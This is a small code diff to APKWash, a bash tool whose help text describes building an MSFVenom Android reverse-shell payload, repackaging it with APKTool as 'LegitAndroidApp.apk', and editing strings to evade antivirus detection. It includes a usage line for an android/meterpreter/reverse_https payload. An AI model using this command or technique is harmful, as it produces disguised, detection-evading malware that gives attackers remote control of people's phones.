@@ -102,7 +102,7 @@ while [ -n "$1" ]; do
 		case "$OPT" in
 			-h* | --help )
 				echo -e "
-APKWash is a simply bash script that leverages MSFVenom to generate a payload, APKTool to decompile and rebuild the packages, and simple SED statements for modifying strings that are being flagged by AV's. 
+APKWash is a simple bash script that leverages MSFVenom to generate a payload, APKTool to decompile and rebuild the packages, and simple SED statements for modifying strings that are being flagged by AV's. 
 
 Usage: apkwash -p android/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -o LegitAndroidApp.apk
 Output: <LegitAndroidApp>.apk & <LegitAndroidApp>.listener
